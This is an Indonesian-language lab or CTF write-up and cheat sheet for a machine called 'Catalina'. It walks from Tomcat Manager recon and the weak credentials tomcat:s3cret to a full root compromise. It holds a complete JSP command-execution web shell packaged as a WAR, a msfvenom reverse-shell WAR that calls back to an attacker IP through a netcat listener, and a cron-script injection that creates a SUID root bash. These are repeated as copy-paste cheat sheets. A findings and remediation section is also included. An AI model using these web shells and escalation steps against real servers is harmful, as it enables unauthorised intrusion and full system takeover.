# 01 Write-Up Lab Catalina
## Tomcat Manager → Deploy WAR → RCE `tomcat` → Writable Root Cron → Root

> **Khusus untuk ujian, laboratorium, CTF, atau pengujian keamanan yang telah memperoleh izin.**
>
> Dokumen ini menggabungkan dua pendekatan:
> - **Pembahasan detail**, untuk memahami alasan dan evidence pada setiap tahap.
> - **Close book cheat sheet**, untuk eksekusi cepat saat praktik atau ujian.

## Cara Menggunakan Dokumen

1. Pelajari **Bagian A** untuk memahami attack path dari recon sampai root.
2. Gunakan **Bagian B** saat menyusun analisis temuan dan rekomendasi.
3. Gunakan **Bagian C** sebagai panduan singkat ketika sudah memahami konsepnya.

## Ringkasan Data Hafalan

```text
TARGET        = 192.168.56.122
WEB           = http://192.168.56.122:8081
ATTACKER_IP   = 192.168.56.116
Credential    = tomcat:s3cret
User foothold = tomcat
Cron root     = /etc/cron.d/backup
Script vuln   = /opt/backup/backup.sh
Root shell    = /tmp/rootbash -p
User flag     = /home/tomcat/FLAG.txt
Root flag     = /root/FLAG.txt
```

## Attack Path Singkat

```text
Nmap 8081
→ /manager/html menghasilkan 401
→ Nikto menemukan tomcat:s3cret
→ validasi /manager/text/list
→ deploy WAR
→ RCE sebagai tomcat
→ baca user flag
→ temukan root cron
→ backup.sh writable oleh group tomcat
→ cron membuat SUID Bash
→ /tmp/rootbash -p
→ baca root flag
```

---

# Bagian A — Pembahasan Detail

> Target pembaca: peserta baru yang belum tahu dari mana credential Tomcat ditemukan dan bagaimana alur sampai flag.

---

## 1. Gambaran Besar

Lab Catalina adalah contoh eksploitasi **Apache Tomcat Manager** yang terbuka dengan credential lemah.

Alur lengkap:

```text
Recon port 8081
→ cek /manager/html
→ endpoint mengembalikan 401 Tomcat Manager
→ scan Nikto menemukan default credential tomcat:s3cret
→ validasi credential ke /manager/text/list
→ deploy WAR
→ RCE sebagai user tomcat
→ cek cron root
→ temukan /opt/backup/backup.sh writable oleh group tomcat
→ tambahkan payload rootbash
→ cron menjalankan payload sebagai root
→ /tmp/rootbash -p
→ cari flag
→ baca /root/FLAG.txt
```

---

## 2. Data Lab

| Item | Nilai |
|---|---|
| Target | `192.168.56.122` |
| Web | `http://192.168.56.122:8081` |
| Service | Apache Tomcat |
| Credential ditemukan | `tomcat:s3cret` |
| Cara menemukan credential | `nikto -h "$WEB"` |
| User awal | `tomcat` |
| Cron root | `/etc/cron.d/backup` |
| Script rentan | `/opt/backup/backup.sh` |
| Root shell | `/tmp/rootbash -p` |
| Cari flag | `find / -type f -iname "*flag*" 2>/dev/null` |
| User flag | `/home/tomcat/FLAG.txt` |
| Root flag | `/root/FLAG.txt` |

---

## 3. Fase 1 — Menemukan Service Tomcat

### Tujuan

Mengetahui apakah target menjalankan Tomcat dan pada port berapa.

### Command

```bash
TARGET="192.168.56.122"
WEB="http://192.168.56.122:8081"

nmap -Pn -sC -sV -p8081 "$TARGET"
```

### Output yang Diharapkan

```text
8081/tcp open  http
Apache Tomcat
```

### Makna Output

Port `8081` terbuka dan service terindikasi Tomcat. Langkah berikutnya adalah mengecek apakah Tomcat Manager tersedia.

---

## 4. Fase 2 — Mengecek Tomcat Manager

### Command

```bash
curl -i "$WEB/manager/html"
```

### Output yang Diharapkan

```text
HTTP/1.1 401
WWW-Authenticate: Basic realm="Tomcat Manager Application"
```

### Makna Output

`401` berarti endpoint ada, tetapi butuh autentikasi. Ini adalah evidence bahwa Tomcat Manager aktif.

> Kesalahan umum peserta baru: menganggap `401` sebagai kegagalan. Untuk recon, `401` justru bukti bahwa endpoint tersedia.

---

## 5. Fase 3 — Menemukan Credential dengan Nikto

### Tujuan

Mencari indikasi default credential atau konfigurasi lemah pada Tomcat.

### Command

```bash
nikto -h "$WEB"
```

### Output Evidence

Pada lab, Nikto memberikan temuan seperti:

```text
/manager/html: Default account found
ID 'tomcat', PW 's3cret'
```

### Makna Output

Nikto menemukan credential default/lemah:

```text
Username : tomcat
Password : s3cret
```

Ini belum cukup untuk exploit. Credential harus divalidasi.

---

## 6. Fase 4 — Validasi Credential Tomcat Manager

### Command

```bash
curl -s \
  -u tomcat:s3cret \
  "$WEB/manager/text/list"
```

### Output yang Diharapkan

```text
OK - Listed applications for virtual host [localhost]
```

### Makna Output

`OK` membuktikan:
- credential valid;
- user dapat mengakses Tomcat Manager text interface;
- jalur deploy WAR bisa digunakan.

### Validasi Tambahan Opsional

```bash
curl -s \
  -u tomcat:s3cret \
  "$WEB/manager/text/serverinfo"
```

Output dapat berisi informasi server, Java, dan OS. Untuk ujian, cukup `manager/text/list` menghasilkan `OK`.

---

# 7. Fase 5A — Foothold Opsi A: JSP Command Runner Manual

Opsi ini paling mudah dipahami karena tidak membutuhkan listener.

## 7.1 Buat JSP Command Runner

```bash
mkdir -p ~/tomcat-lab/labcmd
cd ~/tomcat-lab/labcmd

cat > cmd.jsp <<'EOF'
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    String[] command = {"/bin/sh", "-c", cmd};
    Process p = Runtime.getRuntime().exec(command);
    InputStream in = p.getInputStream();
    InputStream err = p.getErrorStream();
    byte[] b = new byte[4096];
    int n;
    out.println("<pre>");
    while ((n = in.read(b)) != -1) out.write(new String(b,0,n));
    while ((n = err.read(b)) != -1) out.write(new String(b,0,n));
    out.println("</pre>");
}
%>
EOF
```

### Penjelasan

JSP menerima parameter `cmd` dari URL, lalu menjalankan command melalui:

```text
/bin/sh -c <cmd>
```

Contoh nanti:

```text
cmd=id
cmd=whoami
```

## 7.2 Package Menjadi WAR

```bash
zip -r labcmd.war cmd.jsp
```

### Output

```text
  adding: cmd.jsp
```

## 7.3 Deploy WAR

```bash
curl \
  -u tomcat:s3cret \
  --upload-file labcmd.war \
  "$WEB/manager/text/deploy?path=/labcmd&update=true"
```

### Output

```text
OK - Deployed application at context path [/labcmd]
```

## 7.4 Validasi RCE

```bash
SHELL_URL="$WEB/labcmd/cmd.jsp"

curl -sG \
  --data-urlencode "cmd=id; whoami; hostname; pwd" \
  "$SHELL_URL"
```

### Output Evidence

```text
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
tomcat
catalina
/
```

### Makna Output

Kita sudah mendapatkan command execution sebagai user `tomcat`.

---

# 8. Fase 5B — Foothold Opsi B: msfvenom Reverse Shell

Opsi ini memberikan shell interaktif.

## 8.1 Tentukan IP Attacker

```bash
ip -br a
```

Contoh IP attacker pada lab:

```text
192.168.56.116
```

## 8.2 Buat WAR Reverse Shell

```bash
WEB="http://192.168.56.122:8081"
ATTACKER_IP="192.168.56.116"
LPORT="4444"

mkdir -p ~/tomcat-lab/msfvenom
cd ~/tomcat-lab/msfvenom

msfvenom \
  -p java/jsp_shell_reverse_tcp \
  LHOST="$ATTACKER_IP" \
  LPORT="$LPORT" \
  -f war \
  -o catalina-shell.war
```

### Output yang Diharapkan

```text
Payload size: ...
Final size of war file: ...
Saved as: catalina-shell.war
```

## 8.3 Deploy WAR

```bash
curl \
  -u tomcat:s3cret \
  --upload-file catalina-shell.war \
  "$WEB/manager/text/deploy?path=/catalina-shell&update=true"
```

### Output

```text
OK - Deployed application at context path [/catalina-shell]
```

## 8.4 Buka Listener

```bash
nc -lvnp 4444
```

Output:

```text
listening on [any] 4444 ...
```

## 8.5 Trigger Reverse Shell

Terminal lain:

```bash
curl -s "$WEB/catalina-shell/" >/dev/null
```

Jika belum masuk:

```bash
unzip -l catalina-shell.war | grep -E '\.jsp$'
curl -s "$WEB/catalina-shell/NAMA_FILE.jsp" >/dev/null
```

## 8.6 Output Evidence dari Lab

```text
connect to [192.168.56.116] from (UNKNOWN) [192.168.56.122] 42426
id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
whoami
tomcat
hostname
catalina
pwd
/
```

---


---

## 8A. Fase 5C — Cari dan Baca User Flag

Setelah remote command execution diperoleh sebagai user `tomcat`, cari flag terlebih dahulu tanpa langsung mengasumsikan lokasinya.

### Melalui JSP Command Runner

```bash
curl -sG \
  --data-urlencode "cmd=find /home /opt /var/www -type f -iname '*flag*' 2>/dev/null" \
  "$SHELL_URL"
```

Output yang ditemukan pada lab:

```text
/home/tomcat/FLAG.txt
```

Baca flag:

```bash
curl -sG \
  --data-urlencode "cmd=cat /home/tomcat/FLAG.txt" \
  "$SHELL_URL"
```

### Melalui Reverse Shell

```bash
find /home /opt /var/www -type f -iname "*flag*" 2>/dev/null
cat /home/tomcat/FLAG.txt
```

### Evidence User Flag

```text
FLAG{w4r_d3pl0y_7h3n_c474l1n4_5h3ll}
```

User flag membuktikan bahwa tahap **initial access** berhasil sebelum privilege escalation dilakukan.
## 9. Fase 6 — Enumerasi Lokal: Cron Root

### Tujuan

Mencari proses otomatis root yang bisa kita pengaruhi.

### Command

```bash
cat /etc/cron.d/backup 2>/dev/null
```

### Output Evidence

```text
* * * * * root /opt/backup/backup.sh
```

### Makna Output

Setiap menit, root menjalankan:

```text
/opt/backup/backup.sh
```

Langkah berikutnya adalah mengecek apakah script tersebut bisa ditulis oleh user `tomcat`.

---

## 10. Fase 7 — Cek Permission Script

### Command

```bash
ls -lah /opt/backup/backup.sh
stat -c '%A %U %G %n' /opt/backup/backup.sh
cat /opt/backup/backup.sh
```

### Output Evidence dari Lab

```text
-rwxrwxr-x 1 root tomcat 79 Jul 15 06:58 /opt/backup/backup.sh
-rwxrwxr-x root tomcat /opt/backup/backup.sh
#!/bin/bash
# backup task
```

Pada sesi sebelumnya juga terlihat isi script pernah berisi:

```text
cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash
```

### Makna Permission

```text
Owner root   : rwx
Group tomcat : rwx
Other        : r-x
```

Karena shell kita adalah `tomcat`, dan group `tomcat` punya izin tulis, kita bisa menambahkan perintah ke script yang dijalankan root.

---

## 11. Fase 8 — Membuat SUID Rootbash

### Command

```bash
printf '\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\n' >> /opt/backup/backup.sh
sleep 70
ls -l /tmp/rootbash
```

### Output Evidence

```text
-rwsr-xr-x 1 root root 1396520 Jul 15 07:24 /tmp/rootbash
```

### Makna Output

`-rwsr-xr-x` berarti SUID aktif. File dimiliki root. Ketika dijalankan dengan `-p`, bash mempertahankan effective UID root.

---

## 12. Fase 9 — Masuk Root

### Command

```bash
/tmp/rootbash -p
whoami
id
```

### Output Evidence

```text
root
uid=997(tomcat) gid=997(tomcat) euid=0(root) groups=997(tomcat)
```

### Penjelasan

Walaupun `uid` asli masih `tomcat`, `euid=0(root)` berarti proses memiliki hak efektif root.

---

## 13. Fase 10 — Cari dan Baca Flag

### Cari Flag

```bash
find / -type f -iname "*flag*" 2>/dev/null
```

### Output Evidence

```text
/root/FLAG.txt
```

### Baca Flag

```bash
cat /root/FLAG.txt
```

### Output Final

```text
FLAG{cr0n_wr173_2_5u1d_r007b45h}
```

---

## 14. Kesalahan Umum Catalina

| Masalah | Penyebab | Solusi |
|---|---|---|
| `/manager/html` 401 | Endpoint ada tapi butuh login | Lanjut cari credential |
| Nikto tidak langsung terlihat credential | Output panjang | Cari kata `Default account found` |
| Reverse shell tidak masuk | LHOST salah/listener belum aktif | Cek `ip -br a`, jalankan `nc` dulu |
| `/tmp/rootbash` belum muncul | Cron belum jalan | Tunggu `sleep 70` |
| Rootbash tidak root | Menjalankan tanpa `-p` | Gunakan `/tmp/rootbash -p` |

---

## 15. Alur Hafalan Catalina

```text
nmap 8081
curl /manager/html → 401
nikto → tomcat:s3cret
curl manager/text/list → OK
deploy WAR
id → tomcat
cat /etc/cron.d/backup
stat backup.sh → root tomcat rwx
append rootbash
sleep 70
/tmp/rootbash -p
find flag
cat /root/FLAG.txt
```

---

# Bagian B — Analisis Temuan dan Rekomendasi

## 1. Rantai Kerentanan

```text
Tomcat Manager terekspos
→ credential lemah tomcat:s3cret
→ account memiliki hak deploy WAR
→ JSP dijalankan sebagai user tomcat
→ script cron root writable oleh group tomcat
→ command attacker dijalankan root
→ SUID Bash
→ effective UID 0
```

Temuan ini bukan hanya satu kerentanan, tetapi **exploit chain** yang menggabungkan kegagalan autentikasi, paparan antarmuka administratif, dan permission file yang tidak aman.

## 2. Temuan 1 — Weak Credential pada Tomcat Manager

### Deskripsi

Tomcat Manager dapat diakses menggunakan credential lemah `tomcat:s3cret`. Account tersebut memiliki akses ke Manager Text Interface dan dapat melakukan deployment aplikasi WAR.

### Dampak

Penyerang dapat mengunggah JSP berbahaya dan menjalankan perintah sistem operasi sebagai account service Tomcat.

### Evidence utama

```text
/manager/html → HTTP 401 Tomcat Manager
Nikto → tomcat:s3cret
/manager/text/list → OK
Deploy WAR → OK - Deployed application
id → uid=997(tomcat)
```

### Rekomendasi

- Hapus account default dan gunakan password acak yang kuat.
- Batasi Tomcat Manager hanya dari management network, VPN, atau allowlist IP.
- Nonaktifkan aplikasi Manager jika tidak digunakan.
- Terapkan least privilege pada role `manager-gui` dan `manager-script`.
- Pantau deployment baru dan perubahan pada direktori `webapps`.

## 3. Temuan 2 — Root Cron Menjalankan Script Group-Writable

### Deskripsi

Cron root menjalankan `/opt/backup/backup.sh` setiap menit. Script dimiliki `root:tomcat` dengan mode `-rwxrwxr-x`, sehingga user `tomcat` dapat memodifikasinya.

### Dampak

User `tomcat` dapat menentukan command yang akan dieksekusi oleh root, sehingga terjadi local privilege escalation penuh.

### Evidence utama

```text
* * * * * root /opt/backup/backup.sh
-rwxrwxr-x root tomcat /opt/backup/backup.sh
/tmp/rootbash → -rwsr-xr-x root root
id → euid=0(root)
```

### Rekomendasi

```bash
chown root:root /opt/backup/backup.sh
chmod 750 /opt/backup/backup.sh
chown root:root /opt/backup
chmod 750 /opt/backup
```

Tambahan pengamanan:

- Audit semua cron job dan systemd timer yang berjalan dengan privilege tinggi.
- Pastikan file dan direktori yang dipanggil root tidak writable oleh user non-root.
- Terapkan file-integrity monitoring.
- Jalankan scheduled task menggunakan account dengan privilege minimum.

## 4. Checklist Evidence Laporan

| Tahap | Evidence yang Dicatat |
|---|---|
| Recon | Port `8081` dan identifikasi Apache Tomcat |
| Endpoint | Respons `401` dan realm Tomcat Manager |
| Credential | Temuan Nikto `tomcat:s3cret` |
| Validasi | `/manager/text/list` mengembalikan `OK` |
| Deployment | Respons keberhasilan deploy WAR |
| Initial access | Output `id`, `whoami`, dan `hostname` |
| User flag | `/home/tomcat/FLAG.txt` |
| Cron | Isi `/etc/cron.d/backup` |
| Permission | Ownership dan mode `/opt/backup/backup.sh` |
| SUID | Ownership dan mode `/tmp/rootbash` |
| Root | Output `id` dengan `euid=0(root)` |
| Root flag | `/root/FLAG.txt` |

## 5. Ringkasan Temuan Siap Laporan

```text
Tomcat Manager pada port 8081 dapat diakses menggunakan credential lemah
`tomcat:s3cret`. Account tersebut memiliki hak untuk melakukan deployment WAR
melalui Manager Text Interface. File WAR berisi JSP command runner berhasil
dideploy dan dieksekusi sebagai user sistem `tomcat`.

Setelah initial access, ditemukan cron job yang menjalankan
`/opt/backup/backup.sh` sebagai root setiap menit. Script tersebut writable oleh
group `tomcat`. Dengan menambahkan command pembuatan SUID Bash, cron menjalankan
payload sebagai root dan menghasilkan binary `/tmp/rootbash` dengan owner root
serta bit SUID. Binary tersebut dapat dijalankan menggunakan opsi `-p` untuk
memperoleh effective UID 0 dan membaca data yang hanya dapat diakses root.
```

---

# Bagian C — Close Book dan Cheat Sheet

> Gunakan bagian ini setelah memahami pembahasan detail. Nilai IP attacker harus disesuaikan dengan interface pada mesin penguji.

## Opsi 1 — JSP Manual Tanpa Reverse Shell

Pilih ini kalau ingin paling stabil dan tidak bergantung pada callback reverse shell.

### 1. Set target

```bash
TARGET="192.168.56.122"
WEB="http://192.168.56.122:8081"
```

### 2. Buat JSP command runner

```bash
mkdir -p ~/tomcat-lab/labcmd
cd ~/tomcat-lab/labcmd

cat > cmd.jsp <<'EOF'
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    String[] command = {"/bin/sh", "-c", cmd};
    Process p = Runtime.getRuntime().exec(command);
    InputStream in = p.getInputStream();
    InputStream err = p.getErrorStream();
    byte[] b = new byte[4096];
    int n;
    out.println("<pre>");
    while ((n = in.read(b)) != -1) out.write(new String(b,0,n));
    while ((n = err.read(b)) != -1) out.write(new String(b,0,n));
    out.println("</pre>");
}
%>
EOF

zip -r labcmd.war cmd.jsp
```

### 3. Deploy WAR

```bash
curl -u tomcat:s3cret \
  --upload-file labcmd.war \
  "$WEB/manager/text/deploy?path=/labcmd&update=true"
```

Expected:

```text
OK - Deployed application at context path [/labcmd]
```

### 4. Validasi RCE

```bash
SHELL_URL="$WEB/labcmd/cmd.jsp"
curl -sG --data-urlencode "cmd=id; whoami; hostname" "$SHELL_URL"
```

Expected:

```text
uid=997(tomcat)
tomcat
catalina
```

### 5. Langsung tanam payload rootbash

```bash
curl -sG \
  --data-urlencode "cmd=printf '\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\n' >> /opt/backup/backup.sh" \
  "$SHELL_URL"
sleep 70
```

### 6. Cari lokasi flag sebelum tahu nama file

```bash
curl -sG \
  --data-urlencode "cmd=/tmp/rootbash -p -c 'find / -type f -iname \"*flag*\" 2>/dev/null'" \
  "$SHELL_URL"
```

Expected pada lab Catalina:

```text
/root/FLAG.txt
```

### 7. Baca flag dari path yang ditemukan

```bash
curl -sG \
  --data-urlencode "cmd=/tmp/rootbash -p -c 'whoami; cat /root/FLAG.txt'" \
  "$SHELL_URL"
```

Expected:

```text
root
FLAG{cr0n_wr173_2_5u1d_r007b45h}
```

---

## Opsi 2 — msfvenom Reverse Shell

Pilih ini kalau ingin shell interaktif.

### 1. Set target

```bash
TARGET="192.168.56.122"
WEB="http://192.168.56.122:8081"
ATTACKER_IP="192.168.56.116"
LPORT="4444"
```

### 2. Buat WAR reverse shell

```bash
mkdir -p ~/tomcat-lab/msfvenom
cd ~/tomcat-lab/msfvenom

msfvenom \
  -p java/jsp_shell_reverse_tcp \
  LHOST="$ATTACKER_IP" \
  LPORT="$LPORT" \
  -f war \
  -o catalina-shell.war
```

### 3. Deploy WAR

```bash
curl -u tomcat:s3cret \
  --upload-file catalina-shell.war \
  "$WEB/manager/text/deploy?path=/catalina-shell&update=true"
```

### 4. Buka listener

```bash
nc -lvnp 4444
```

### 5. Trigger shell

Buka terminal lain:

```bash
curl -s "$WEB/catalina-shell/" >/dev/null
```

Kalau shell belum masuk:

```bash
unzip -l catalina-shell.war | grep jsp
curl -s "$WEB/catalina-shell/NAMA_FILE.jsp" >/dev/null
```

### 6. Setelah shell masuk

Di terminal `nc`:

```bash
id
whoami
hostname
```

Expected:

```text
uid=997(tomcat)
tomcat
catalina
```

### 7. Langsung buat rootbash

```bash
printf '\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\n' >> /opt/backup/backup.sh
sleep 70
```

### 8. Masuk root

```bash
/tmp/rootbash -p
whoami
id
```

Expected:

```text
root
euid=0(root)
```

### 9. Cari lokasi flag

```bash
find / -type f -iname "*flag*" 2>/dev/null
```

Expected pada lab Catalina:

```text
/root/FLAG.txt
```

### 10. Baca flag dari path yang ditemukan

```bash
cat /root/FLAG.txt
```

Expected:

```text
FLAG{cr0n_wr173_2_5u1d_r007b45h}
```

---

## Cheat Sheet Paling Pendek

### JSP Manual

```bash
WEB="http://192.168.56.122:8081"
mkdir -p ~/tomcat-lab/labcmd && cd ~/tomcat-lab/labcmd

cat > cmd.jsp <<'EOF'
<%@ page import="java.io.*" %><% String c=request.getParameter("cmd"); if(c!=null){String[] x={"/bin/sh","-c",c}; Process p=Runtime.getRuntime().exec(x); InputStream i=p.getInputStream(),e=p.getErrorStream(); byte[] b=new byte[4096]; int n; out.println("<pre>"); while((n=i.read(b))!=-1)out.write(new String(b,0,n)); while((n=e.read(b))!=-1)out.write(new String(b,0,n)); out.println("</pre>"); } %>
EOF

zip -r labcmd.war cmd.jsp
curl -u tomcat:s3cret --upload-file labcmd.war "$WEB/manager/text/deploy?path=/labcmd&update=true"

SHELL_URL="$WEB/labcmd/cmd.jsp"
curl -sG --data-urlencode "cmd=id;whoami;hostname" "$SHELL_URL"

curl -sG --data-urlencode "cmd=printf '\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\n' >> /opt/backup/backup.sh" "$SHELL_URL"
sleep 70
curl -sG --data-urlencode "cmd=/tmp/rootbash -p -c 'find / -type f -iname \"*flag*\" 2>/dev/null'" "$SHELL_URL"
curl -sG --data-urlencode "cmd=/tmp/rootbash -p -c 'whoami; cat /root/FLAG.txt'" "$SHELL_URL"
```

### msfvenom

Terminal 1:

```bash
WEB="http://192.168.56.122:8081"
ATTACKER_IP="192.168.56.116"
LPORT="4444"

mkdir -p ~/tomcat-lab/msfvenom && cd ~/tomcat-lab/msfvenom
msfvenom -p java/jsp_shell_reverse_tcp LHOST="$ATTACKER_IP" LPORT="$LPORT" -f war -o catalina-shell.war
curl -u tomcat:s3cret --upload-file catalina-shell.war "$WEB/manager/text/deploy?path=/catalina-shell&update=true"
nc -lvnp 4444
```

Terminal 2:

```bash
curl -s "$WEB/catalina-shell/" >/dev/null
```

Setelah shell masuk di Terminal 1:

```bash
printf '\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\n' >> /opt/backup/backup.sh
sleep 70
/tmp/rootbash -p
find / -type f -iname "*flag*" 2>/dev/null
cat /root/FLAG.txt
```

---

# Alur Hafalan Akhir

```text
SCAN → MANAGER → CREDENTIAL → DEPLOY → TOMCAT → USER FLAG → CRON → WRITABLE → SUID → ROOT → ROOT FLAG
```
